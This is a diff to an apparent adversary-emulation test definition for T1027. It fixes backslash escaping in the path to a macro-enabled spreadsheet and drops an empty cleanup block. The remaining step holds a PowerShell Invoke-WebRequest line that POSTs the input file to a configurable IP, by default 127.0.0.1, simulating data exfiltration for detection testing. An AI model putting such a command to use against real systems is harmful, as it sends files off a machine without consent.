@@ -6,7 +6,7 @@ description: |
 args:
     - name: input_file
       type: path
-      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+      default: PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm
     - name: ip_address
       type: string
       default: 127.0.0.1
@@ -24,6 +24,3 @@ steps:
       inline: |
         Invoke-WebRequest -Uri {{.Args.ip_address}} -Method POST -Body "{{.Args.input_file}}"
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
